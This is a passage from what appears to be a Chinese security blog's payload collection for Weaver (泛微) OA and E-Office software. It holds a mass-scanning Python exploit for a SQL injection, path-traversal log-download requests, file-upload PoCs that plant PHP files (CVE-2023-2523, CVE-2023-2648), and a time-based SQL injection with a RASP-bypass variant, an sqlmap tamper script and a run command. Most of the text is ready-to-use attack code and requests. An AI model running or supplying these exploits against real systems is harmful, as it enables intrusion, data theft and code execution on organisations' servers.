+formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>批量exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#config=utf-8</span>
+
+<span class="token keyword">import</span> requests<span class="token punctuation">,</span>json
+
+
+<span class="token keyword">def</span> <span class="token function">fanwei</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+
+        url <span class="token operator">=</span> urls<span class="token operator">+</span><span class="token string">"mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333"</span>
+        data <span class="token operator">=</span> <span class="token string">"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 "</span>
+
+
+        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+                    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
+                    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"2236"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span><span class="token string">"1"</span>
+                <span class="token punctuation">&#125;</span>
+
+        info <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> info<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            json_info <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>info<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> json_info <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">" 不存在漏洞"</span><span class="token punctuation">)</span>
+                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"no.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>json_info<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">" 存在漏洞"</span><span class="token punctuation">)</span>
+                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ok.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">"不存在漏洞"</span><span class="token punctuation">)</span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"no.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>HTTPError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">" --HTTPError"</span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"error.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">" --ConnectionError"</span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"error.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">" --Timeout"</span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"error.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> json<span class="token punctuation">.</span>decoder<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">" --JSONDecodeError"</span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"error.txt"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>urls <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+fp<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"123.txt"</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> line <span class="token keyword">in</span> fp<span class="token punctuation">:</span>
+    line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+    fanwei<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="泛微OA-日志泄露"><a href="#泛微OA-日志泄露" class="headerlink" title="泛微OA 日志泄露"></a>泛微OA 日志泄露</h2><p>读取物理路径</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">hrm&#x2F;kq&#x2F;gethrmkq.jsp?filename&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>日志下载</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">hrm&#x2F;kq&#x2F;gethrmkq.jsp?filename&#x3D;1..\1..\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="泛微-E-Office文件上传漏洞（CVE-2023-2523"><a href="#泛微-E-Office文件上传漏洞（CVE-2023-2523" class="headerlink" title="泛微 E-Office文件上传漏洞（CVE-2023-2523)"></a>泛微 E-Office文件上传漏洞（CVE-2023-2523)</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/17677408.html">https://www.cnblogs.com/pursue-security/p/17677408.html</a></p>
+<p>版本：泛微e-office 9.5版本</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1  
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">your-ip</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  </span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="upload_quwan"; filename="1.php." </span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/jpeg</span></span>
+
+&lt;?php phpinfo();?>
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename=""</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span>
+
+
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501105024053.png" alt="image-20240501105024053"></p>
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501105133041.png" alt="image-20240501105133041"></p>
+<hr>
+<h2 id="泛微-E-Office文件上传漏洞-（CVE-2023-2648）"><a href="#泛微-E-Office文件上传漏洞-（CVE-2023-2648）" class="headerlink" title="泛微 E-Office文件上传漏洞 （CVE-2023-2648）"></a>泛微 E-Office文件上传漏洞 （CVE-2023-2648）</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41904294/article/details/130832416">https://blog.csdn.net/qq_41904294/article/details/130832416</a></p>
+<p>版本：泛微e-office 9.5版本</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">your-ip</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">204</span></span>
+<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">null</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="Fdiledata"; filename="uploadify.php."</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/jpeg</span></span>
+ 
+&lt;?php phpinfo();?>
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501105351984.png" alt="image-20240501105351984"></p>
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501105427838.png" alt="image-20240501105427838"></p>
+<p>与 CVE-2023-2523的不同点就是，他返回的只有一个随机的文件夹参数，并非完整路径</p>
+<hr>
+<h2 id="泛微E-Cology-SQL注入漏洞-CVE-2023-15672"><a href="#泛微E-Cology-SQL注入漏洞-CVE-2023-15672" class="headerlink" title="泛微E-Cology SQL注入漏洞(CVE-2023-15672)"></a>泛微E-Cology SQL注入漏洞(CVE-2023-15672)</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/17677238.html">https://www.cnblogs.com/pursue-security/p/17677238.html</a></p>
+<p>版本：Ecology 9.x 补丁版本 &lt; 10.58.0；Ecology 8.x 补丁版本 &lt; 10.58.0</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/weaver/weaver.file.FileDownloadForOutDoc</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> </span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">45</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+
+fileid=123+WAITFOR+DELAY+'0:0:15'&amp;isFromOutImg=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501105645715.png" alt="image-20240501105645715"></p>
+<p>因为泛微 OA 启用了 <strong>RASP</strong>，同一个执行语句第二次注入就会被拦截，因此需要不断修改请求包。给出绕过的请求包：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/weaver/weaver.file.FileDownloadForOutDoc</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> </span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">45</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+
+fileid=&#123;random&#125;+WAITFOR+DELAY+'0:0:5'&amp;isFromOutImg=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>sqlmap利用：请求遍历随机数去配合payload实现注入的tamper脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>re<span class="token punctuation">,</span>random
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS
+
+priority <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST
+
+<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	result <span class="token operator">=</span> <span class="token string">""</span>
+	num <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">27</span><span class="token punctuation">)</span>
+	result <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>payload
+	<span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-r</span> post.txt <span class="token parameter variable">--tamper</span><span class="token operator">=</span>ecology_sql_random.py <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
